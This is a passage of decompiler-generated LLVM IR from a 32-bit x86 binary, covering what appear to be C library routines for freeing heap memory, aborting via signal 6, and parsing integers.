  %v3_805399c = inttoptr i32 %v2_805399c to i32*
  store i32 %v0_805399c, i32* %v3_805399c, align 4
  br label %dec_label_pc_8053abc

dec_label_pc_80539a4:                             ; preds = %dec_label_pc_805394c
  %v1_80539a4 = trunc i32 %v3_8053978 to i8
  %v2_80539a4 = and i8 %v1_80539a4, 2
  %v3_80539a4 = icmp eq i8 %v2_80539a4, 0
  %v5_80539a4 = zext i8 %v2_80539a4 to i32
  %v7_80539a4 = and i32 %v3_8053978, -256
  %v8_80539a4 = or i32 %v5_80539a4, %v7_80539a4
  store i32 %v8_80539a4, i32* @edx, align 4
  %v1_80539a7 = icmp eq i1 %v3_80539a4, false
  br i1 %v1_80539a7, label %dec_label_pc_8053a9c, label %dec_label_pc_80539ad

dec_label_pc_80539ad:                             ; preds = %dec_label_pc_80539a4
  %v1_80539ad = or i32 %v1_8053970, 1
  %v3_80539ad = trunc i32 %v1_80539ad to i8
  store i32 %v1_80539ad, i32* %eax.global-to-local, align 4
  %v2_80539b0 = add i32 %v1_805397d, %v1_805396d
  store i32 %v2_80539b0, i32* @esi, align 4
  store i8 %v3_80539ad, i8* @global_var_8056ba0.207, align 32
  %v1_80539b8 = add i32 %v2_80539b0, 4
  %v2_80539b8 = inttoptr i32 %v1_80539b8 to i32*
  %v3_80539b8 = load i32, i32* %v2_80539b8, align 4
  store i32 %v3_80539b8, i32* %eax.global-to-local, align 4
  %v2_80539bf = inttoptr i32 %v1_8053978 to i8*
  %v3_80539bf = load i8, i8* %v2_80539bf, align 1
  %v4_80539bf = urem i8 %v3_80539bf, 2
  %v5_80539bf = icmp eq i8 %v4_80539bf, 0
  %v1_80539c3 = icmp eq i1 %v5_80539bf, false
  br i1 %v1_80539c3, label %dec_label_pc_80539e6, label %dec_label_pc_80539c5

dec_label_pc_80539c5:                             ; preds = %dec_label_pc_80539ad
  %v2_80539c5 = inttoptr i32 %v1_805396d to i32*
  %v3_80539c5 = load i32, i32* %v2_80539c5, align 4
  store i32 %v3_80539c5, i32* @ebp, align 4
  %v2_80539ca = sub i32 %v1_805396d, %v3_80539c5
  store i32 %v2_80539ca, i32* %eax.global-to-local, align 4
  %v1_80539cc = add i32 %v2_80539ca, 8
  %v2_80539cc = inttoptr i32 %v1_80539cc to i32*
  %v3_80539cc = load i32, i32* %v2_80539cc, align 4
  store i32 %v3_80539cc, i32* @edi, align 4
  %v1_80539cf = add i32 %v2_80539ca, 12
  %v2_80539cf = inttoptr i32 %v1_80539cf to i32*
  %v3_80539cf = load i32, i32* %v2_80539cf, align 4
  store i32 %v3_80539cf, i32* @edx, align 4
  %v1_80539d2 = add i32 %v3_80539cc, 12
  %v2_80539d2 = inttoptr i32 %v1_80539d2 to i32*
  %v3_80539d2 = load i32, i32* %v2_80539d2, align 4
  store i32 %v3_80539d2, i32* @ecx, align 4
  %v12_80539d5 = icmp eq i32 %v3_80539d2, %v2_80539ca
  %v1_80539d7 = icmp eq i1 %v12_80539d5, false
  br i1 %v1_80539d7, label %dec_label_pc_8053a15, label %dec_label_pc_80539d9

dec_label_pc_80539d9:                             ; preds = %dec_label_pc_80539c5
  %v1_80539d9 = add i32 %v3_80539cf, 8
  %v2_80539d9 = inttoptr i32 %v1_80539d9 to i32*
  %v3_80539d9 = load i32, i32* %v2_80539d9, align 4
  %v15_80539d9 = icmp eq i32 %v3_80539d9, %v3_80539d2
  %v1_80539dc = icmp eq i1 %v15_80539d9, false
  br i1 %v1_80539dc, label %dec_label_pc_8053a15, label %dec_label_pc_80539de

dec_label_pc_80539de:                             ; preds = %dec_label_pc_80539d9
  %v2_80539de = add i32 %v3_80539c5, %v1_805397d
  store i32 %v2_80539de, i32* @ebx, align 4
  store i32 %v3_80539cf, i32* %v2_80539d2, align 4
  %v0_80539e3 = load i32, i32* @edi, align 4
  %v1_80539e3 = load i32, i32* @edx, align 4
  %v2_80539e3 = add i32 %v1_80539e3, 8
  %v3_80539e3 = inttoptr i32 %v2_80539e3 to i32*
  store i32 %v0_80539e3, i32* %v3_80539e3, align 4
  %v0_80539ed.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80539e6

dec_label_pc_80539e6:                             ; preds = %dec_label_pc_80539ad, %dec_label_pc_80539de
  %v1_80539f9 = phi i32 [ %v2_80539b0, %dec_label_pc_80539ad ], [ %v0_80539ed.pre, %dec_label_pc_80539de ]
  %v1_80539ea = and i32 %v3_80539b8, -4
  store i32 %v1_80539ea, i32* @ebp, align 4
  %v1_80539ed = load i32, i32* @global_var_8056bcc.208, align 4
  %v12_80539ed = icmp eq i32 %v1_80539f9, %v1_80539ed
  br i1 %v12_80539ed, label %dec_label_pc_8053a47, label %dec_label_pc_80539f5

dec_label_pc_80539f5:                             ; preds = %dec_label_pc_80539e6
  %v2_80539f5 = add i32 %v1_80539f9, 4
  %v3_80539f5 = add i32 %v2_80539f5, %v1_80539ea
  %v4_80539f5 = inttoptr i32 %v3_80539f5 to i32*
  %v5_80539f5 = load i32, i32* %v4_80539f5, align 4
  store i32 %v5_80539f5, i32* %eax.global-to-local, align 4
  %v3_80539f9 = inttoptr i32 %v2_80539f5 to i32*
  store i32 %v1_80539ea, i32* %v3_80539f9, align 4
  %v0_80539fc = load i32, i32* %eax.global-to-local, align 4
  %v1_80539fc = urem i32 %v0_80539fc, 2
  %v2_80539fc = icmp eq i32 %v1_80539fc, 0
  store i32 %v1_80539fc, i32* %eax.global-to-local, align 4
  %v1_8053a01 = icmp eq i1 %v2_80539fc, false
  br i1 %v1_8053a01, label %dec_label_pc_8053a22, label %dec_label_pc_8053a03

dec_label_pc_8053a03:                             ; preds = %dec_label_pc_80539f5
  %v0_8053a03 = load i32, i32* @esi, align 4
  %v1_8053a03 = add i32 %v0_8053a03, 8
  %v2_8053a03 = inttoptr i32 %v1_8053a03 to i32*
  %v3_8053a03 = load i32, i32* %v2_8053a03, align 4
  store i32 %v3_8053a03, i32* @edx, align 4
  %v1_8053a06 = add i32 %v0_8053a03, 12
  %v2_8053a06 = inttoptr i32 %v1_8053a06 to i32*
  %v3_8053a06 = load i32, i32* %v2_8053a06, align 4
  store i32 %v3_8053a06, i32* %eax.global-to-local, align 4
  %v1_8053a09 = add i32 %v3_8053a03, 12
  %v2_8053a09 = inttoptr i32 %v1_8053a09 to i32*
  %v3_8053a09 = load i32, i32* %v2_8053a09, align 4
  store i32 %v3_8053a09, i32* @edi, align 4
  %v12_8053a0c = icmp eq i32 %v3_8053a09, %v0_8053a03
  %v1_8053a0e = icmp eq i1 %v12_8053a0c, false
  br i1 %v1_8053a0e, label %dec_label_pc_8053a15, label %dec_label_pc_8053a10

dec_label_pc_8053a10:                             ; preds = %dec_label_pc_8053a03
  %v1_8053a10 = add i32 %v3_8053a06, 8
  %v2_8053a10 = inttoptr i32 %v1_8053a10 to i32*
  %v3_8053a10 = load i32, i32* %v2_8053a10, align 4
  %v15_8053a10 = icmp eq i32 %v3_8053a10, %v3_8053a09
  br i1 %v15_8053a10, label %dec_label_pc_8053a1a, label %dec_label_pc_8053a15

dec_label_pc_8053a15:                             ; preds = %dec_label_pc_8053a10, %dec_label_pc_8053a03, %dec_label_pc_80539d9, %dec_label_pc_80539c5
  %v0_8053a15 = call i32 @function_8053ad5()
  store i32 %v0_8053a15, i32* %eax.global-to-local, align 4
  %v1_8053a1a.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053a1a

dec_label_pc_8053a1a:                             ; preds = %dec_label_pc_8053a10, %dec_label_pc_8053a15
  %v1_8053a1a = phi i32 [ %v3_8053a03, %dec_label_pc_8053a10 ], [ %v1_8053a1a.pre, %dec_label_pc_8053a15 ]
  %v0_8053a1a = phi i32 [ %v3_8053a06, %dec_label_pc_8053a10 ], [ %v0_8053a15, %dec_label_pc_8053a15 ]
  %v2_8053a1a = add i32 %v1_8053a1a, 12
  %v3_8053a1a = inttoptr i32 %v2_8053a1a to i32*
  store i32 %v0_8053a1a, i32* %v3_8053a1a, align 4
  %v0_8053a1d = load i32, i32* @edx, align 4
  %v1_8053a1d = load i32, i32* %eax.global-to-local, align 4
  %v2_8053a1d = add i32 %v1_8053a1d, 8
  %v3_8053a1d = inttoptr i32 %v2_8053a1d to i32*
  store i32 %v0_8053a1d, i32* %v3_8053a1d, align 4
  %v0_8053a20 = load i32, i32* @ebx, align 4
  %v1_8053a20 = load i32, i32* @ebp, align 4
  %v2_8053a20 = add i32 %v1_8053a20, %v0_8053a20
  store i32 %v2_8053a20, i32* @ebx, align 4
  br label %dec_label_pc_8053a22

dec_label_pc_8053a22:                             ; preds = %dec_label_pc_80539f5, %dec_label_pc_8053a1a
  %v0_8053a22 = load i32, i32* @global_var_8056bdc.226, align 4
  store i32 %v0_8053a22, i32* %eax.global-to-local, align 4
  %v0_8053a27 = load i32, i32* @ecx, align 4
  %v1_8053a27 = add i32 %v0_8053a27, 12
  %v2_8053a27 = inttoptr i32 %v1_8053a27 to i32*
  store i32 ptrtoint (i32* @global_var_8056bd4.210 to i32), i32* %v2_8053a27, align 4
  %v0_8053a2e = load i32, i32* %eax.global-to-local, align 4
  %v1_8053a2e = load i32, i32* @ecx, align 4
  %v2_8053a2e = add i32 %v1_8053a2e, 8
  %v3_8053a2e = inttoptr i32 %v2_8053a2e to i32*
  store i32 %v0_8053a2e, i32* %v3_8053a2e, align 4
  %v0_8053a31 = load i32, i32* @ebx, align 4
  %v1_8053a31 = load i32, i32* @ecx, align 4
  %v3_8053a31 = add i32 %v1_8053a31, %v0_8053a31
  %v4_8053a31 = inttoptr i32 %v3_8053a31 to i32*
  store i32 %v0_8053a31, i32* %v4_8053a31, align 4
  %v0_8053a34 = load i32, i32* @ecx, align 4
  %v1_8053a34 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053a34 = add i32 %v1_8053a34, 12
  %v3_8053a34 = inttoptr i32 %v2_8053a34 to i32*
  store i32 %v0_8053a34, i32* %v3_8053a34, align 4
  %v0_8053a37 = load i32, i32* @ebx, align 4
  %v1_8053a39 = or i32 %v0_8053a37, 1
  store i32 %v1_8053a39, i32* %eax.global-to-local, align 4
  %v0_8053a3c = load i32, i32* @ecx, align 4
  store i32 %v0_8053a3c, i32* @global_var_8056bdc.226, align 4
  %v2_8053a42 = add i32 %v0_8053a3c, 4
  %v3_8053a42 = inttoptr i32 %v2_8053a42 to i32*
  store i32 %v1_8053a39, i32* %v3_8053a42, align 4
  br label %dec_label_pc_8053a57

dec_label_pc_8053a47:                             ; preds = %dec_label_pc_80539e6
  %v0_8053a47 = load i32, i32* @ebx, align 4
  %v2_8053a47 = add i32 %v0_8053a47, %v1_80539ea
  store i32 %v2_8053a47, i32* @ebx, align 4
  %v1_8053a4b = or i32 %v2_8053a47, 1
  store i32 %v1_8053a4b, i32* %eax.global-to-local, align 4
  %v1_8053a4e = load i32, i32* @ecx, align 4
  %v2_8053a4e = add i32 %v1_8053a4e, 4
  %v3_8053a4e = inttoptr i32 %v2_8053a4e to i32*
  store i32 %v1_8053a4b, i32* %v3_8053a4e, align 4
  %v0_8053a51 = load i32, i32* @ecx, align 4
  store i32 %v0_8053a51, i32* @global_var_8056bcc.208, align 4
  br label %dec_label_pc_8053a57

dec_label_pc_8053a57:                             ; preds = %dec_label_pc_8053a22, %dec_label_pc_8053a47
  %v0_8053a57 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_8053a57, 131072
  br i1 %tmp21, label %dec_label_pc_8053abc, label %dec_label_pc_8053a5f

dec_label_pc_8053a5f:                             ; preds = %dec_label_pc_8053a57
  %v0_8053a5f = load i8, i8* @global_var_8056ba0.207, align 32
  %v1_8053a5f = and i8 %v0_8053a5f, 2
  %v2_8053a5f = icmp eq i8 %v1_8053a5f, 0
  br i1 %v2_8053a5f, label %dec_label_pc_8053a78, label %dec_label_pc_8053a68

dec_label_pc_8053a68:                             ; preds = %dec_label_pc_8053a5f
  %v2_8053a70 = call i32 @function_8053791(i32* bitcast (i8* @global_var_8056ba0.207 to i32*))
  store i32 %v2_8053a70, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053a78

dec_label_pc_8053a78:                             ; preds = %dec_label_pc_8053a5f, %dec_label_pc_8053a68
  %v0_8053a78 = load i32, i32* @global_var_8056bcc.208, align 4
  store i32 %v0_8053a78, i32* %eax.global-to-local, align 4
  %v1_8053a7d = add i32 %v0_8053a78, 4
  %v2_8053a7d = inttoptr i32 %v1_8053a7d to i32*
  %v3_8053a7d = load i32, i32* %v2_8053a7d, align 4
  %v1_8053a80 = and i32 %v3_8053a7d, -4
  store i32 %v1_8053a80, i32* %eax.global-to-local, align 4
  %v1_8053a83 = load i32, i32* @global_var_8056ee4.224, align 4
  %v7_8053a83 = icmp ult i32 %v1_8053a80, %v1_8053a83
  br i1 %v7_8053a83, label %dec_label_pc_8053abc, label %dec_label_pc_8053a8b

dec_label_pc_8053a8b:                             ; preds = %dec_label_pc_8053a78
  store i32 ptrtoint (i8* @global_var_8056ba0.207 to i32), i32* @edx, align 4
  %v0_8053a90 = load i32, i32* @global_var_8056ee8.222, align 8
  store i32 %v0_8053a90, i32* @eax, align 4
  %v0_8053a95 = call i32 @function_8053704()
  store i32 %v0_8053a95, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053abc

dec_label_pc_8053a9c:                             ; preds = %dec_label_pc_80539a4
  %v2_8053a9c = inttoptr i32 %v1_805396d to i32*
  %v3_8053a9c = load i32, i32* %v2_8053a9c, align 4
  %v0_8053a9f = load i32, i32* @global_var_8056ef0.215, align 16
  %v1_8053a9f = add i32 %v0_8053a9f, -1
  store i32 %v1_8053a9f, i32* @global_var_8056ef0.215, align 16
  %v2_8053aa5 = add i32 %v3_8053a9c, %v1_805397d
  store i32 %v2_8053aa5, i32* %eax.global-to-local, align 4
  %v2_8053aa8 = sub i32 %v1_805396d, %v3_8053a9c
  %v0_8053aae = load i32, i32* @global_var_8056f04.218, align 4
  %v2_8053aae = sub i32 %v0_8053aae, %v2_8053aa5
  store i32 %v2_8053aae, i32* @global_var_8056f04.218, align 4
  %v4_8053ab4 = inttoptr i32 %v2_8053aa8 to i32*
  %v5_8053ab4 = call i32 @function_8054805(i32* %v4_8053ab4, i32 %v2_8053aa5, i32 %v1_805397d, i32 %v1_805397d)
  store i32 %v5_8053ab4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053abc

dec_label_pc_8053abc:                             ; preds = %dec_label_pc_8053a78, %dec_label_pc_8053a57, %dec_label_pc_8053a8b, %dec_label_pc_8053984, %dec_label_pc_8053a9c
  store i32 %v2_8053957, i32* @eax, align 4
  %v2_8053ac5 = call i32 @function_80540a0(i32 %v2_8053957, i32 1)
  store i32 %v2_8053ac5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053acd

dec_label_pc_8053acd:                             ; preds = %dec_label_pc_8053939, %dec_label_pc_8053abc
  %.0 = phi i32 [ undef, %dec_label_pc_8053939 ], [ %v2_8053ac5, %dec_label_pc_8053abc ]
  store i32 %v0_805393c, i32* @ebx, align 4
  store i32 %v0_805393b, i32* @esi, align 4
  store i32 %v0_805393a, i32* @edi, align 4
  store i32 %v0_8053939, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8053a9c, { 1, 0 }
  uselistorder i32 %v0_8053a31, { 1, 0 }
  uselistorder i32 %v1_80539fc, { 1, 0 }
  uselistorder i32 %v2_80539f5, { 1, 0 }
  uselistorder i32 %v1_80539ea, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80539f9, { 1, 0 }
  uselistorder i32 %v1_805397d, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8053978, { 1, 2, 0, 3 }
  uselistorder i32 %v1_805396d, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_8056ba0.207 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8056bd4.210 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_8056bcc.208, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i8* @global_var_8056ba0.207 to i32), { 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_8056ba0.207, { 4, 7, 6, 5, 3, 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8056800.206 to i32), { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8053acd, { 1, 0 }
  uselistorder label %dec_label_pc_8053abc, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8053a78, { 1, 0 }
  uselistorder label %dec_label_pc_8053a57, { 1, 0 }
  uselistorder label %dec_label_pc_8053a22, { 1, 0 }
  uselistorder label %dec_label_pc_8053a1a, { 1, 0 }
  uselistorder label %dec_label_pc_80539e6, { 1, 0 }
}

define i32 @function_8053ad5() local_unnamed_addr {
dec_label_pc_8053af0.lr.ph:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8053ae1 = call i32 @function_805409d(i32 ptrtoint (i32* @global_var_8056818.227 to i32))
  %v12_8053aeb = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8053af048 = add i32 %v12_8053aeb, 276
  %v5_8053af049 = inttoptr i32 %v4_8053af048 to i32*
  store i32 0, i32* %v5_8053af049, align 4
  %v0_8053afb50 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053afb51 = add i32 %v0_8053afb50, -1
  %v9_8053afb52 = icmp slt i32 %v1_8053afb51, 0
  store i32 %v1_8053afb51, i32* %eax.global-to-local, align 4
  %v1_8053afc53 = icmp eq i1 %v9_8053afb52, false
  br i1 %v1_8053afc53, label %dec_label_pc_8053af0.dec_label_pc_8053af0_crit_edge, label %dec_label_pc_8053afe

dec_label_pc_8053af0.dec_label_pc_8053af0_crit_edge: ; preds = %dec_label_pc_8053af0.lr.ph, %dec_label_pc_8053af0.dec_label_pc_8053af0_crit_edge
  %v1_8053afb54 = phi i32 [ %v1_8053afb, %dec_label_pc_8053af0.dec_label_pc_8053af0_crit_edge ], [ %v1_8053afb51, %dec_label_pc_8053af0.lr.ph ]
  %v0_8053af0.pre = load i32, i32* @esp, align 4
  %v2_8053af0 = mul i32 %v1_8053afb54, 4
  %v3_8053af0 = add i32 %v0_8053af0.pre, 152
  %v4_8053af0 = add i32 %v3_8053af0, %v2_8053af0
  %v5_8053af0 = inttoptr i32 %v4_8053af0 to i32*
  store i32 0, i32* %v5_8053af0, align 4
  %v0_8053afb = load i32, i32* %eax.global-to-local, align 4
  %v1_8053afb = add i32 %v0_8053afb, -1
  %v9_8053afb = icmp slt i32 %v1_8053afb, 0
  store i32 %v1_8053afb, i32* %eax.global-to-local, align 4
  %v1_8053afc = icmp eq i1 %v9_8053afb, false
  br i1 %v1_8053afc, label %dec_label_pc_8053af0.dec_label_pc_8053af0_crit_edge, label %dec_label_pc_8053afe

dec_label_pc_8053afe:                             ; preds = %dec_label_pc_8053af0.dec_label_pc_8053af0_crit_edge, %dec_label_pc_8053af0.lr.ph
  %v0_8053afe = load i32, i32* @ebx, align 4
  %v2_8053b02 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8053b02, i32* @ebx, align 4
  %v4_8053b0a = call i32 @function_8052b2e(i32 %v2_8053b02, i32 6, i32 %v0_8053afe, i32 %v0_8053afe)
  store i32 %v4_8053b0a, i32* %eax.global-to-local, align 4
  %v1_8053b12 = icmp eq i32 %v4_8053b0a, 0
  %v1_8053b14 = icmp eq i1 %v1_8053b12, false
  br i1 %v1_8053b14, label %dec_label_pc_8053b24, label %dec_label_pc_8053b16

dec_label_pc_8053b16:                             ; preds = %dec_label_pc_8053afe
  %v3_8053b1c = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8053b1c = call i32 @function_805244d(i32 1, %_TYPEDEF_sigset_t* %v3_8053b1c, i32 0)
  store i32 %v4_8053b1c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b24

dec_label_pc_8053b24:                             ; preds = %dec_label_pc_8053afe, %dec_label_pc_8053b16
  %v2_8053b5c23 = phi i32 [ %v4_8053b0a, %dec_label_pc_8053afe ], [ %v4_8053b1c, %dec_label_pc_8053b16 ]
  %v0_8053b24 = load i8, i8* @global_var_8056914.228, align 4
  %v1_8053b24 = icmp eq i8 %v0_8053b24, 0
  %v1_8053b2b = icmp eq i1 %v1_8053b24, false
  br i1 %v1_8053b2b, label %dec_label_pc_8053b5c, label %dec_label_pc_8053b2d

dec_label_pc_8053b2d:                             ; preds = %dec_label_pc_8053b24
  store i8 1, i8* @global_var_8056914.228, align 4
  br label %dec_label_pc_8053b34

dec_label_pc_8053b34:                             ; preds = %dec_label_pc_8053b9b, %dec_label_pc_8053b2d
  %v1_8053b3c = call i32 @function_805409d(i32 ptrtoint (i32* @global_var_8056818.227 to i32))
  store i32 %v1_8053b3c, i32* %eax.global-to-local, align 4
  %v1_8053b48 = call i32 @function_8052a00(i32 6)
  store i32 %v1_8053b48, i32* %eax.global-to-local, align 4
  %v1_8053b54 = call i32 @function_805409d(i32 ptrtoint (i32* @global_var_8056818.227 to i32))
  store i32 %v1_8053b54, i32* %eax.global-to-local, align 4
  %v0_8053b5c.pre = load i8, i8* @global_var_8056914.228, align 4
  br label %dec_label_pc_8053b5c

dec_label_pc_8053b5c:                             ; preds = %dec_label_pc_8053b24, %dec_label_pc_8053b34
  %v2_8053b5c = phi i32 [ %v2_8053b5c23, %dec_label_pc_8053b24 ], [ %v1_8053b54, %dec_label_pc_8053b34 ]
  %v0_8053b5c = phi i8 [ %v0_8053b24, %dec_label_pc_8053b24 ], [ %v0_8053b5c.pre, %dec_label_pc_8053b34 ]
  %v1_8053b5c = zext i8 %v0_8053b5c to i32
  %v3_8053b5c = and i32 %v2_8053b5c, -256
  %v4_8053b5c = or i32 %v1_8053b5c, %v3_8053b5c
  store i32 %v4_8053b5c, i32* %eax.global-to-local, align 4
  %v10_8053b61 = icmp eq i8 %v0_8053b5c, 1
  %v1_8053b63 = icmp eq i1 %v10_8053b61, false
  br i1 %v1_8053b63, label %dec_label_pc_8053bbd, label %dec_label_pc_8053b90.lr.ph

dec_label_pc_8053b90.lr.ph:                       ; preds = %dec_label_pc_8053b5c
  store i8 2, i8* @global_var_8056914.228, align 4
  %v2_8053b74 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8053b74, i32* %eax.global-to-local, align 4
  %v3_8053b79 = bitcast i32* %stack_var_-272 to i8*
  %v4_8053b79 = call i32 @function_805276a(i8* %v3_8053b79, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8053b9040 = add i32 %v12_8053aeb, 140
  %v5_8053b9041 = inttoptr i32 %v4_8053b9040 to i32*
  store i32 -1, i32* %v5_8053b9041, align 4
  %v0_8053b9842 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053b9843 = add i32 %v0_8053b9842, -1
  %v9_8053b9844 = icmp slt i32 %v1_8053b9843, 0
  store i32 %v1_8053b9843, i32* %eax.global-to-local, align 4
  %v1_8053b9945 = icmp eq i1 %v9_8053b9844, false
  br i1 %v1_8053b9945, label %dec_label_pc_8053b90.dec_label_pc_8053b90_crit_edge, label %dec_label_pc_8053b9b

dec_label_pc_8053b90.dec_label_pc_8053b90_crit_edge: ; preds = %dec_label_pc_8053b90.lr.ph, %dec_label_pc_8053b90.dec_label_pc_8053b90_crit_edge
  %v1_8053b9846 = phi i32 [ %v1_8053b98, %dec_label_pc_8053b90.dec_label_pc_8053b90_crit_edge ], [ %v1_8053b9843, %dec_label_pc_8053b90.lr.ph ]
  %v0_8053b90.pre = load i32, i32* @esp, align 4
  %v2_8053b90 = mul i32 %v1_8053b9846, 4
  %v3_8053b90 = add i32 %v0_8053b90.pre, 16
  %v4_8053b90 = add i32 %v3_8053b90, %v2_8053b90
  %v5_8053b90 = inttoptr i32 %v4_8053b90 to i32*
  store i32 -1, i32* %v5_8053b90, align 4
  %v0_8053b98 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053b98 = add i32 %v0_8053b98, -1
  %v9_8053b98 = icmp slt i32 %v1_8053b98, 0
  store i32 %v1_8053b98, i32* %eax.global-to-local, align 4
  %v1_8053b99 = icmp eq i1 %v9_8053b98, false
  br i1 %v1_8053b99, label %dec_label_pc_8053b90.dec_label_pc_8053b90_crit_edge, label %dec_label_pc_8053b9b

dec_label_pc_8053b9b:                             ; preds = %dec_label_pc_8053b90.dec_label_pc_8053b90_crit_edge, %dec_label_pc_8053b90.lr.ph
  store i32 %v2_8053b74, i32* %eax.global-to-local, align 4
  %v4_8053bb0 = call i32 @function_80542df(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_8053bb0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b34

dec_label_pc_8053bbd:                             ; preds = %dec_label_pc_8053b5c
  %v10_8053bbd = icmp eq i8 %v0_8053b5c, 2
  %v1_8053bbf = icmp eq i1 %v10_8053bbd, false
  br i1 %v1_8053bbf, label %dec_label_pc_8053bc9, label %dec_label_pc_8053bc9.thread

dec_label_pc_8053bc9.thread:                      ; preds = %dec_label_pc_8053bbd
  store i8 3, i8* @global_var_8056914.228, align 4
  br label %dec_label_pc_8053bd2

dec_label_pc_8053bc9:                             ; preds = %dec_label_pc_8053bbd
  %v9_8053bc9 = icmp eq i8 %v0_8053b5c, 3
  %v1_8053bd0 = icmp eq i1 %v9_8053bc9, false
  br i1 %v1_8053bd0, label %dec_label_pc_8053be3, label %dec_label_pc_8053bd2

dec_label_pc_8053bd2:                             ; preds = %dec_label_pc_8053bc9.thread, %dec_label_pc_8053bc9
  store i8 4, i8* @global_var_8056914.228, align 4
  %v1_8053bde = call i32 @function_8054440(i32 127)
  unreachable

dec_label_pc_8053be3:                             ; preds = %dec_label_pc_8053bc9, %dec_label_pc_8053be3
  br label %dec_label_pc_8053be3

; uselistorder directives
  uselistorder i32 %v1_8053b98, { 2, 1, 0 }
  uselistorder i32 %v1_8053afb, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 15, 16, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10, 17, 18, 13, 14 }
  uselistorder i8 3, { 0, 4, 1, 2, 3 }
  uselistorder i8 2, { 8, 11, 12, 1, 13, 2, 3, 4, 5, 6, 14, 15, 7, 0, 10, 16, 9 }
  uselistorder i8* @global_var_8056914.228, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8053be3, { 1, 0 }
  uselistorder label %dec_label_pc_8053bd2, { 1, 0 }
  uselistorder label %dec_label_pc_8053b90.dec_label_pc_8053b90_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8053b5c, { 1, 0 }
  uselistorder label %dec_label_pc_8053b24, { 1, 0 }
  uselistorder label %dec_label_pc_8053af0.dec_label_pc_8053af0_crit_edge, { 1, 0 }
}

define i32 @function_8053be6() local_unnamed_addr {
dec_label_pc_8053be6:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v3_8053bf1 = call i32 @function_8053bfa(i32 %tmp, i32 0, i32 10)
  ret i32 %v3_8053bf1
}

define i32 @function_8053bfa(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8053bfa:
  %v4_8053c0b = inttoptr i32 %arg1 to i8*
  %v5_8053c0b = call i32 @function_8053c14(i8* %v4_8053c0b, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_8053c0b
}

define i32 @function_8053c14(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8053c14:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg4 to i8
  %tmp42 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_8053c17 = load i32, i32* @ebx, align 4
  store i32 %v0_8053c17, i32* %stack_var_-16, align 4
  %v0_8053c1b = load i32, i32* bitcast (i32** @global_var_805684c.230 to i32*), align 4
  store i32 %v0_8053c1b, i32* %edx.global-to-local, align 4
  %v4_8053c21 = ptrtoint i8* %arg1 to i32
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %v4_8053c21, i32* %ebx.global-to-local, align 4
  %v2_8053c2e8 = load i8, i8* %arg1, align 1
  %v3_8053c2e9 = sext i8 %v2_8053c2e8 to i32
  store i32 %v3_8053c2e9, i32* %eax.global-to-local, align 4
  %v2_8053c3111 = mul nsw i32 %v3_8053c2e9, 2
  %v3_8053c3112 = add i32 %v2_8053c3111, %v0_8053c1b
  %v4_8053c3113 = inttoptr i32 %v3_8053c3112 to i8*
  %v5_8053c3114 = load i8, i8* %v4_8053c3113, align 1
  %v6_8053c3115 = and i8 %v5_8053c3114, 32
  %v7_8053c3116 = icmp eq i8 %v6_8053c3115, 0
  %v1_8053c3517 = icmp eq i1 %v7_8053c3116, false
  br i1 %v1_8053c3517, label %dec_label_pc_8053c2d, label %dec_label_pc_8053c37

